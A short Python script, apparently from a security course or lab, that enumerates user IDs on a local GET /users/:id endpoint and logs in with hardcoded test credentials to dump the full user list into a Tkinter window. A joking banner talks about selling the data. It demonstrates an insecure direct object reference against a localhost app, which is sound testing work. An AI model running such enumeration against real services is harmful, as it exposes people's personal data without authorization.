# Author: Ritchie Yapp
# https://github.com/speckly

# This script brute forces endpoint 11 GET /users/:id

import requests
import os
import json
import tkinter as tk
from tkinter import scrolledtext

def display_json(json_data: str):
    window = tk.Tk()
    window.title("FREE DATA")
    window.configure(bg='black')

    text_widget = scrolledtext.ScrolledText(window, wrap=tk.WORD, width=80, height=40, bg='black', fg='light green')
    text_widget.pack(expand=True, fill="both")

    parsed_data = json.loads(json_data)
    pretty_json = json.dumps(parsed_data, indent=2)

    text_widget.tag_configure('red_tag', foreground='red')
    text_widget.tag_configure('green_tag', foreground='light green')

    start_index = 1.0
    for line in pretty_json.split('\n'):
        if "Admin" in line:
            text_widget.insert(tk.END, line + '\n', 'red_tag')
        else:
            text_widget.insert(tk.END, line + '\n', 'green_tag')

    text_widget.configure(state='disabled')


    window.mainloop()

def get_users(ENDPOINT: str, customer_account: bool=False, admin_account: bool=False) -> None: # To be exported
    LOGIN_ENDPOINT = "http://localhost:8081/user/login"
    if customer_account:
        LOGIN_BODY = {
            "username": "user1",
            "password": "123"
        }
        TOKEN = requests.post(LOGIN_ENDPOINT, json=LOGIN_BODY).json()["token"]
        HEADERS = {
            "Authorization": f"Bearer {TOKEN}"
        }
        print(f"Logged in as user1, our token is {TOKEN}")
    elif admin_account:
        LOGIN_BODY = {
            "username": "user",
            "password": "123"
        }
        TOKEN = requests.post(LOGIN_ENDPOINT, json=LOGIN_BODY).json()["token"]
        HEADERS = {
            "Authorization": f"Bearer {TOKEN}"
        }
        print(f"Logged in as user, our token is {TOKEN}")
    else: 
        HEADERS = False
    display_json(requests.get(ENDPOINT, headers=HEADERS if HEADERS else '').text)

def get_users_incremental(ID_LOWER_LIMIT: int=30, ID_UPPER_LIMIT: int=40) -> None:
    for user_id in range(ID_LOWER_LIMIT, ID_UPPER_LIMIT):
        res = requests.get(f"{ENDPOINT}/{user_id}").text
        print(f"{user_id}: {res}")

if __name__ == "__main__":
    ENDPOINT = 'http://localhost:8081/users'
    ID_LOWER_LIMIT, ID_UPPER_LIMIT = 34, 40

    while True:
        user_select = input("Select endpoint\n1. GET /users/:id\n2. GET /users\n")
        if user_select == "1" or user_select == "2":
            break
        else:
            print("Invalid input")

    os.system('cls')
    print("Script by @speckly\nFREE USER DATA SELL SELL SELL MONEY GO KACHING KACHING\n")

    match user_select:
        case "1":
            get_users_incremental(ID_LOWER_LIMIT, ID_UPPER_LIMIT)
        case "2":
            customer_account = True if input("Use customer account? (N) ") not in "nN" else False # Includes blank
            if customer_account:
                get_users(ENDPOINT, customer_account)
            else:
                admin_account = True if input("Use admin account? (N) ") not in "nN" else False # Includes blank
                get_users(ENDPOINT, False, admin_account)

